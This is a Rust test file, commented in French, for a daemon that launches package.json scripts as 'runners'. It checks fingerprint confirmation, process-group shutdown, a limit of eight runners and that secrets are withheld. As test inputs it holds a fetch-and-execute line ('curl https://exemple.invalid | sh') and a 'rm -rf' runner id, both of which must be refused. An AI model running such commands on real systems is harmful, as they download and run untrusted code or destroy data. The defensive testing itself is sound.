//! v0.3, lot 14a : runners. Détection d'un `package.json` de test, lancement
//! par un faux `npm` (script `sh`), sortie, URL repérée, `PORT` transmis,
//! arrêt du groupe entier, limite de 8, refus d'un `runner_id` inconnu.

mod common;

use std::path::Path;
use std::time::{Duration, Instant};

use common::*;
use serde_json::{Value, json};
use uuid::Uuid;

/// Faux `npm` : `npm run <nom>` lance `scripts/<nom>.sh` avec `sh` (le
/// démon ne fait que construire `npm run <nom>`).
/// Sous la sonde de `write_executable` (`DEVMAESTRO_PROBE`), il sort aussitôt.
const FAKE_NPM: &str = "#!/bin/sh\n[ -n \"$DEVMAESTRO_PROBE\" ] && exit 0\n[ \"$1\" = run ] || exit 64\nexec sh \"./scripts/$2.sh\"\n";

/// Délai entre SIGTERM et SIGKILL du démon des tests.
const STOP_TIMEOUT: Duration = Duration::from_millis(1000);

fn env_with_npm(scripts: &[(&str, &str)]) -> Env {
    let mut env = Env::new();
    let bin = env.proj.parent().unwrap().join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    write_executable(&bin.join("npm"), FAKE_NPM);
    let path = format!(
        "{}:{}",
        bin.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    env.extra_env.push(("PATH".into(), path));
    env.extra_env.push((
        "DEVMAESTRO_STOP_TIMEOUT_MS".into(),
        STOP_TIMEOUT.as_millis().to_string(),
    ));
    // Secrets de l'utilisateur : jamais transmis au code du dépôt.
    env.extra_env
        .push(("GH_TOKEN".into(), "jeton-github-secret".into()));
    env.extra_env
        .push(("ANTHROPIC_API_KEY".into(), "cle-anthropic-secrete".into()));
    let mut pkg = serde_json::Map::new();
    std::fs::create_dir_all(env.proj.join("scripts")).unwrap();
    for (name, body) in scripts {
        pkg.insert((*name).to_owned(), json!(format!("sh scripts/{name}.sh")));
        std::fs::write(env.proj.join(format!("scripts/{name}.sh")), body).unwrap();
    }
    std::fs::write(
        env.proj.join("package.json"),
        serde_json::to_string(&json!({"scripts": pkg})).unwrap(),
    )
    .unwrap();
    std::fs::write(env.proj.join("package-lock.json"), "{}").unwrap();
    env
}

/// Ajoute à `params` l'empreinte confirmée du runner, lue dans
/// `runners.list` (« inconnue » si la session ou le runner n'y est pas).
fn with_fingerprint(c: &mut Client, mut params: Value) -> Value {
    let list = c.call_raw("runners.list", json!({"id": params["id"]}));
    let fp = list["result"]["runners"]
        .as_array()
        .and_then(|rs| rs.iter().find(|r| r["id"] == params["runner_id"]))
        .map_or(json!("inconnue"), |r| r["fingerprint"].clone());
    params["expected_fingerprint"] = fp;
    params
}

/// `runners.start` avec l'empreinte affichée par `runners.list`.
fn start_runner(c: &mut Client, params: Value) -> Value {
    let p = with_fingerprint(c, params);
    c.call("runners.start", p)
}

fn start_runner_err(c: &mut Client, params: Value) -> i64 {
    let p = with_fingerprint(c, params);
    c.call_err("runners.start", p)
}

/// Dernier état d'un processus de runner vu dans `runners.changed`.
fn last_proc(c: &Client, process_id: &str) -> Option<Value> {
    c.notifications.iter().rev().find_map(|n| {
        (n["method"] == "runners.changed")
            .then(|| {
                n["params"]["running"]
                    .as_array()?
                    .iter()
                    .find(|p| p["process_id"] == process_id)
                    .cloned()
            })
            .flatten()
    })
}

fn wait_exited(c: &mut Client, process_id: &str) -> Value {
    c.wait_until("runner terminé", |c| {
        last_proc(c, process_id).is_some_and(|p| p["state"] == "exited")
    });
    last_proc(c, process_id).unwrap()
}

/// Le processus n'existe plus (ou n'est plus qu'un zombie en attente).
fn gone(pid: u32) -> bool {
    match std::fs::read_to_string(format!("/proc/{pid}/stat")) {
        Err(_) => true,
        Ok(s) => s
            .rsplit_once(')')
            .is_some_and(|(_, rest)| rest.trim_start().starts_with('Z')),
    }
}

fn wait_gone(pid: u32) {
    let start = Instant::now();
    while !gone(pid) {
        assert!(start.elapsed() < TIMEOUT, "le processus {pid} vit encore");
        std::thread::sleep(Duration::from_millis(20));
    }
}

fn read_pid(dir: &Path, file: &str) -> u32 {
    let start = Instant::now();
    loop {
        if let Some(pid) = std::fs::read_to_string(dir.join(file))
            .ok()
            .and_then(|s| s.trim().parse().ok())
        {
            return pid;
        }
        assert!(start.elapsed() < TIMEOUT, "{file} absent");
        std::thread::sleep(Duration::from_millis(20));
    }
}

const DEV: &str = r#"echo "PORT=$PORT HOST=$HOST TOKEN=${ORCH_TOKEN:-absent} CC=${CLAUDECODE:-absent} CFG=${CLAUDE_CONFIG_DIR:-absent} GH=${GH_TOKEN:-absent} AK=${ANTHROPIC_API_KEY:-absent} MO=${CLAUDE_CODE_MAX_OUTPUT_TOKENS:-absent}"
sleep 1000 &
echo $! > child.pid
echo $$ > main.pid
printf '  \033[32mLocal:\033[0m   http://localhost:\033[1m%s\033[22m/\n' "$PORT"
read line
echo "lu: $line"
wait
"#;

#[test]
fn detect_launch_output_url_port_and_group_stop() {
    let env = env_with_npm(&[
        ("dev", DEV),
        ("test", "echo ok\nexit 3\n"),
        ("serve", "exec sleep 1000\n"),
        (
            "orphan",
            "(trap '' HUP TERM; exec sleep 1000) &\necho $! > orphan.pid\nexit 0\n",
        ),
    ]);
    let _d = env.start_daemon();
    let mut c = Client::connect(&env);
    let hello = c.call("hello", json!({}));
    assert_eq!(hello["capabilities"]["runners"], true);
    let sid = launch_idle(&mut c, &env, json!({}));

    let list = c.call("runners.list", json!({"id": sid}));
    let dev = list["runners"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["id"] == "package.json:dev")
        .unwrap_or_else(|| panic!("runner dev absent : {list}"))
        .clone();
    assert_eq!(dev["command"], json!(["npm", "run", "dev"]));
    assert_eq!(dev["kind"], "dev");
    assert_eq!(dev["cwd"], "");
    assert_eq!(dev["source"], "package.json:dev");
    assert_eq!(list["running"], json!([]));

    assert_eq!(dev["fingerprint"].as_str().unwrap().len(), 64);
    assert!(dev["body"].as_str().unwrap().contains("scripts/dev.sh"));
    // Le corps du script change entre l'affichage et le lancement : refusé,
    // même commande (`npm run dev`).
    let pkg_path = env.proj.join("package.json");
    let original = std::fs::read_to_string(&pkg_path).unwrap();
    std::fs::write(
        &pkg_path,
        original.replace("sh scripts/dev.sh", "curl https://exemple.invalid | sh"),
    )
    .unwrap();
    let r = c.call_raw(
        "runners.start",
        json!({"id": sid, "runner_id": "package.json:dev", "expected_fingerprint": dev["fingerprint"]}),
    );
    assert_eq!(r["error"]["code"], -32024, "{r}");
    assert_eq!(
        r["error"]["message"],
        "la commande a changé depuis sa confirmation"
    );
    let now = r["error"]["data"]["fingerprint"]
        .as_str()
        .unwrap()
        .to_owned();
    assert_ne!(json!(now), dev["fingerprint"]);
    std::fs::write(&pkg_path, &original).unwrap();
    // Empreinte absente : paramètre invalide.
    assert_eq!(
        c.call_err(
            "runners.start",
            json!({"id": sid, "runner_id": "package.json:dev"})
        ),
        -32602
    );

    // Jamais de commande libre : seuls les identifiants détectés passent.
    for bad in [
        "npm run dev",
        "package.json:rm -rf",
        "",
        "package.json:dev2",
    ] {
        let code = start_runner_err(&mut c, json!({"id": sid, "runner_id": bad}));
        assert!(
            code == -32024 || (bad.is_empty() && code == -32602),
            "{bad}: {code}"
        );
    }
    assert_eq!(
        start_runner_err(
            &mut c,
            json!({"id": Uuid::new_v4(), "runner_id": "package.json:dev"})
        ),
        -32001
    );

    let p = start_runner(
        &mut c,
        json!({"id": sid, "runner_id": "package.json:dev", "cols": 100, "rows": 20}),
    );
    assert_eq!(p["warnings"], json!([]));
    let pid_s = p["process_id"].as_str().unwrap().to_owned();
    let process_id: Uuid = pid_s.parse().unwrap();
    assert_eq!(p["runner_id"], "package.json:dev");
    assert_eq!(p["session_id"], json!(sid));
    assert_eq!(p["state"], "running");
    let port = p["port"].as_u64().unwrap();
    assert!((41000..=41999).contains(&port), "{port}");

    // Déjà lancé : refusé.
    assert_eq!(
        start_runner_err(&mut c, json!({"id": sid, "runner_id": "package.json:dev"})),
        -32002
    );

    // Exécution d'une autre session : refusée.
    for m in ["runners.subscribe", "runners.stop", "runners.resize"] {
        assert_eq!(
            c.call_err(
                m,
                json!({"id": Uuid::new_v4(), "process_id": pid_s, "cols": 80, "rows": 20})
            ),
            -32026,
            "{m}"
        );
    }
    let sub = c.call(
        "runners.subscribe",
        json!({"id": sid, "process_id": pid_s, "history": true, "cols": 90, "rows": 25}),
    );
    assert_eq!(sub["process_id"], pid_s);
    assert_eq!(sub["snapshot"]["cols"], 90);
    assert_eq!(sub["snapshot"]["rows"], 25);
    // `Session.runners_running` suit les runners vivants.
    c.wait_until("runners_running = 1", |c| {
        c.last_session(sid)
            .is_some_and(|s| s["runners_running"] == 1)
    });
    assert_eq!(
        c.call(
            "runners.resize",
            json!({"id": sid, "process_id": pid_s, "cols": 100, "rows": 20})
        ),
        json!({"cols": 100, "rows": 20})
    );
    let seen = |c: &Client, text: &str| {
        let hist = sub["history"].as_str().unwrap_or("");
        hist.contains(text) || c.output_text(process_id).contains(text)
    };
    let expected = format!(
        "PORT={port} HOST=127.0.0.1 TOKEN=absent CC=absent CFG=absent GH=absent AK=absent MO=absent"
    );
    c.wait_until("sortie du runner", |c| seen(c, &expected));
    let url = format!("http://localhost:{port}/");
    c.wait_until("URL repérée", |c| {
        last_proc(c, &pid_s).is_some_and(|p| p["urls"] == json!([url]))
    });

    // Saisie : trame 0x03 avec l'identifiant du processus.
    c.input(process_id, b"bonjour\n");
    c.wait_until("entrée lue", |c| seen(c, "lu: bonjour"));

    let main_pid = read_pid(&env.proj, "main.pid");
    let child_pid = read_pid(&env.proj, "child.pid");
    assert_eq!(
        c.call("runners.stop", json!({"process_id": pid_s})),
        json!({"stopping": true, "alive": true})
    );
    let done = wait_exited(&mut c, &pid_s);
    assert!(done["ended_at"].is_string());
    c.wait_until("runners_running = 0", |c| {
        c.last_session(sid)
            .is_some_and(|s| s["runners_running"] == 0)
    });
    // Tout le groupe est arrêté, l'enfant en arrière-plan compris.
    wait_gone(main_pid);
    wait_gone(child_pid);
    // Déjà arrêté.
    assert_eq!(
        c.call("runners.stop", json!({"process_id": pid_s})),
        json!({"stopping": false, "alive": false})
    );
    assert_eq!(
        c.call_err("runners.stop", json!({"process_id": Uuid::new_v4()})),
        -32026
    );
    assert_eq!(
        c.call_err("runners.subscribe", json!({"process_id": Uuid::new_v4()})),
        -32026
    );

    // Code de sortie, et port stable pour le worktree.
    let t = start_runner(&mut c, json!({"id": sid, "runner_id": "package.json:test"}));
    assert_eq!(t["port"].as_u64(), Some(port));
    assert_eq!(t["kind"], "test");
    let tid = t["process_id"].as_str().unwrap().to_owned();
    let done = wait_exited(&mut c, &tid);
    assert_eq!(done["exit_code"], 3);

    // Relancer remplace le processus terminé du même runner.
    let again = start_runner(&mut c, json!({"id": sid, "runner_id": "package.json:dev"}));
    assert_eq!(again["port"].as_u64(), Some(port));
    let running = c.call("runners.list", json!({"id": sid}))["running"].clone();
    let devs: Vec<&Value> = running
        .as_array()
        .unwrap()
        .iter()
        .filter(|p| p["runner_id"] == "package.json:dev")
        .collect();
    assert_eq!(devs.len(), 1, "{running}");
    assert_eq!(devs[0]["process_id"], again["process_id"]);

    // Second serveur de développement du même worktree : même PORT, averti.
    let serve = start_runner(
        &mut c,
        json!({"id": sid, "runner_id": "package.json:serve"}),
    );
    assert_eq!(serve["port"].as_u64(), Some(port));
    let w = serve["warnings"].as_array().unwrap();
    assert_eq!(w.len(), 1, "{serve}");
    assert!(w[0].as_str().unwrap().contains(&format!("PORT={port}")));
    c.call("runners.stop", json!({"process_id": serve["process_id"]}));
    wait_exited(&mut c, serve["process_id"].as_str().unwrap());

    // Le chef sort, un descendant ignore SIGHUP et SIGTERM : tué (SIGKILL)
    // après le délai d'arrêt.
    let o = start_runner(
        &mut c,
        json!({"id": sid, "runner_id": "package.json:orphan"}),
    );
    let done = wait_exited(&mut c, o["process_id"].as_str().unwrap());
    assert_eq!(done["exit_code"], 0);
    let orphan = read_pid(&env.proj, "orphan.pid");
    wait_gone(orphan);

    // `sessions.stop` avec `stop_runners` arrête aussi les runners.
    let r = c.call("sessions.stop", json!({"id": sid, "stop_runners": true}));
    assert_eq!(r["runners_stopping"], 1);
    wait_exited(&mut c, again["process_id"].as_str().unwrap());
}

#[test]
fn at_most_eight_live_runners_and_sigkill_after_sigterm() {
    let stubborn = "trap '' TERM\nsleep 1000 &\necho $! > s1.pid\nwait\nwait\n";
    let mut scripts: Vec<(String, String)> = vec![("s1".into(), stubborn.into())];
    for i in 2..=9 {
        scripts.push((format!("s{i}"), "exec sleep 1000\n".into()));
    }
    let refs: Vec<(&str, &str)> = scripts
        .iter()
        .map(|(a, b)| (a.as_str(), b.as_str()))
        .collect();
    let env = env_with_npm(&refs);
    let _d = env.start_daemon();
    let mut c = Client::connect(&env);
    c.call("hello", json!({}));
    let sid = launch_idle(&mut c, &env, json!({}));

    let mut ids = Vec::new();
    for i in 1..=8 {
        let p = start_runner(
            &mut c,
            json!({"id": sid, "runner_id": format!("package.json:s{i}")}),
        );
        ids.push(p["process_id"].as_str().unwrap().to_owned());
    }
    assert_eq!(
        start_runner_err(&mut c, json!({"id": sid, "runner_id": "package.json:s9"})),
        -32025
    );

    // s1 ignore SIGTERM (son enfant aussi, par héritage) : SIGKILL au bout de 3 s.
    let child = read_pid(&env.proj, "s1.pid");
    let start = Instant::now();
    c.call("runners.stop", json!({"process_id": ids[0]}));
    let done = wait_exited(&mut c, &ids[0]);
    assert!(
        start.elapsed() >= STOP_TIMEOUT.mul_f32(0.8),
        "{:?}",
        start.elapsed()
    );
    assert_eq!(done["exit_code"], Value::Null);
    assert!(done["signal"].is_string(), "{done}");
    wait_gone(child);

    // Une place s'est libérée.
    start_runner(&mut c, json!({"id": sid, "runner_id": "package.json:s9"}));

    // Oublier la session arrête ses runners.
    c.call("sessions.stop", json!({"id": sid}));
    c.wait_until("session arrêtée", |c| {
        c.last_session(sid).is_some_and(|s| s["alive"] == false)
    });
    c.call("sessions.forget", json!({"id": sid}));
    let pids: Vec<u32> = std::fs::read_dir("/proc")
        .unwrap()
        .filter_map(|e| e.ok()?.file_name().to_str()?.parse::<u32>().ok())
        .filter(|pid| std::fs::read_link(format!("/proc/{pid}/cwd")).is_ok_and(|p| p == env.proj))
        .collect();
    for pid in pids {
        wait_gone(pid);
    }
}

fn git(dir: &Path, args: &[&str]) -> bool {
    std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .args([
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@t",
            "-c",
            "commit.gpgsign=false",
        ])
        .args(args)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|s| s.success())
}

#[test]
fn removing_the_worktree_stops_its_runners() {
    if !git_available() {
        eprintln!("git absent : test sauté");
        return;
    }
    let env = env_with_npm(&[("dev", "echo $$ > ../dev.pid\nexec sleep 1000\n")]);
    let repo = env.proj.clone();
    assert!(git(&repo, &["init", "-q", "-b", "main"]));
    assert!(git(&repo, &["add", "."]));
    assert!(git(&repo, &["commit", "-q", "-m", "base"]));
    let _d = env.start_daemon();
    let mut c = Client::connect(&env);
    c.call("hello", json!({}));
    let r = c.call(
        "sessions.launch",
        json!({"cwd": repo, "cols": 80, "rows": 24, "mode": "default",
               "worktree": {"branch": "feat/r", "location": "sibling"}}),
    );
    let wt = std::path::PathBuf::from(r["worktree"]["path"].as_str().unwrap());
    let sid: Uuid = r["session"]["id"].as_str().unwrap().parse().unwrap();
    c.wait_until("session inactive", |c| {
        c.last_session(sid)
            .is_some_and(|s| status_label(&s) == "idle")
    });
    let p = start_runner(&mut c, json!({"id": sid, "runner_id": "package.json:dev"}));
    let pid_s = p["process_id"].as_str().unwrap().to_owned();
    let dev_pid = read_pid(wt.parent().unwrap(), "dev.pid");

    // La session s'arrête, le runner continue ; supprimer le worktree l'arrête.
    c.call("sessions.stop", json!({"id": sid}));
    c.wait_until("session arrêtée", |c| {
        c.last_session(sid).is_some_and(|s| s["alive"] == false)
    });
    assert_eq!(last_proc(&c, &pid_s).unwrap()["state"], "running");
    let r = c.call(
        "worktrees.remove",
        json!({"root": repo, "path": wt, "force": true}),
    );
    assert_eq!(r["removed"], true);
    wait_exited(&mut c, &pid_s);
    wait_gone(dev_pid);
}
